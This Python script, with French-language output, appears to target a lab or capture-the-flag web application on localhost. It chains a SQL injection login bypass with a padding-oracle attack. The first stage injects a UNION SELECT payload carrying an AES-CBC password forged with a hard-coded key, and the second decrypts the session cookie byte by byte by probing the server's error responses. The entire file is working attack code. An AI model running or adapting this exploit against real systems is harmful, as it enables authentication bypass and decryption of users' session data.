#!/usr/bin/env python3

import time
import base64
import requests
from urllib.parse import unquote
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad


URL_TARGET = "http://localhost:8085/"
SECRET_KEY = b"this_is_key_you_"
PASSWORD_TO_FORGE = "P@ssw0rd123"
BLOCK_SIZE = 16
MAX_ATTEMPTS = 15


def create_encrypted_pass_for_sqli(password: str, key: bytes) -> str:
    iv = get_random_bytes(BLOCK_SIZE)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_password = pad(password.encode('utf-8'), BLOCK_SIZE)
    ciphertext = cipher.encrypt(padded_password)
    encrypted_blob = iv + ciphertext
    return base64.b64encode(encrypted_blob).decode('utf-8')

def get_fresh_cookies() -> dict:
    print("\n[PHASE 1] Tentative d'obtention de cookies de session frais via SQLi...")
    encrypted_pass = create_encrypted_pass_for_sqli(PASSWORD_TO_FORGE, SECRET_KEY)
    username_payload = f"' UNION SELECT 'attacker', '{encrypted_pass}' -- "
    form_data = {"username": username_payload, "password": PASSWORD_TO_FORGE}
    try:
        response = requests.post(URL_TARGET, data=form_data, timeout=10, allow_redirects=False)
        if response.status_code in [200, 302] and 'token' in response.cookies:
            cookies = response.cookies.get_dict()
            cookies['ID'] = unquote(cookies['ID'])
            cookies['token'] = unquote(cookies['token'])
            print(f"[+] Succès ! Nouveaux cookies obtenus: {cookies}")
            return cookies
        return None
    except requests.exceptions.RequestException:
        return None

def is_padding_valid(iv_b64: str, id_b64: str, session_id: str) -> bool:
    cookies = {"PHPSESSID": session_id, "token": iv_b64, "ID": id_b64}
    try:
        response = requests.get(URL_TARGET, cookies=cookies, timeout=5)
        return "ERROR!" not in response.text
    except requests.exceptions.RequestException:
        return False

def decrypt_block(iv_bytes: bytes, cipher_bytes: bytes, session_id: str) -> bytes:
    print(f"[*] Début du déchiffrement pour le bloc: {cipher_bytes.hex()}")
    plaintext_block = bytearray(BLOCK_SIZE)
    intermediate_block = bytearray(BLOCK_SIZE)
    for byte_index in range(BLOCK_SIZE - 1, -1, -1):
        padding_value = BLOCK_SIZE - byte_index
        forged_iv = bytearray(BLOCK_SIZE)
        for i in range(byte_index + 1, BLOCK_SIZE):
            forged_iv[i] = intermediate_block[i] ^ padding_value
        found_byte = False
        for guess in range(256):
            time.sleep(0.01)
            forged_iv[byte_index] = guess
            forged_iv_b64 = base64.b64encode(forged_iv).decode()
            cipher_b64 = base64.b64encode(cipher_bytes).decode()
            if is_padding_valid(forged_iv_b64, cipher_b64, session_id):
                if byte_index > 0:
                    test_iv = forged_iv[:]
                    test_iv[byte_index - 1] = (test_iv[byte_index - 1] + 1) % 256
                    test_iv_b64 = base64.b64encode(test_iv).decode()
                    if not is_padding_valid(test_iv_b64, cipher_b64, session_id):
                        continue
                intermediate_block[byte_index] = guess ^ padding_value
                plaintext_block[byte_index] = intermediate_block[byte_index] ^ iv_bytes[byte_index]
                found_byte = True
                print(f"    -> Octet {byte_index} trouvé: {hex(plaintext_block[byte_index])} ('{chr(plaintext_block[byte_index])}')")
                break
        if not found_byte:
            print(f"    [!] ERREUR: Impossible de trouver l'octet {byte_index}.")
            return b"DECRYPTION_FAILED"
    return bytes(plaintext_block)


if __name__ == "__main__":
    decrypted_text = b"DECRYPTION_FAILED"
    
    for attempt in range(MAX_ATTEMPTS):
        print(f"\n--- TENTATIVE {attempt + 1}/{MAX_ATTEMPTS} ---")
        fresh_cookies = get_fresh_cookies()
        
        if fresh_cookies:
            print("\n[PHASE 2] Les cookies sont valides, lancement de l'attaque par Padding Oracle...")
            
            iv = base64.b64decode(fresh_cookies['token'])
            ciphertext = base64.b64decode(fresh_cookies['ID'])
            session_id = fresh_cookies['PHPSESSID']
            
            decrypted_text = decrypt_block(iv, ciphertext, session_id)
            
            if decrypted_text != b"DECRYPTION_FAILED":
                print("[+] Déchiffrement réussi lors de cette tentative !")
                break 
        
        if decrypted_text != b"DECRYPTION_FAILED":
            break
        else:
             print("[!] La tentative a échoué, relance du processus complet...")

    print("\n\n--- RÉSULTAT FINAL ---")
    if decrypted_text != b"DECRYPTION_FAILED":
        try:
            padding_len = decrypted_text[-1]
            if padding_len > 0 and padding_len <= BLOCK_SIZE:
                unpadded_text = decrypted_text[:-padding_len]
                print(f"Texte déchiffré (brut): {unpadded_text.hex()}")
                print(f"Texte déchiffré (UTF-8): {unpadded_text.decode('utf-8', errors='ignore')}")
            else:
                print(f"Padding invalide détecté (valeur: {padding_len}). Texte brut: {decrypted_text.hex()}")
        except IndexError:
            print("Le texte déchiffré est vide.")
    else:
        print(f"[!] Le déchiffrement a échoué après {MAX_ATTEMPTS} tentatives.")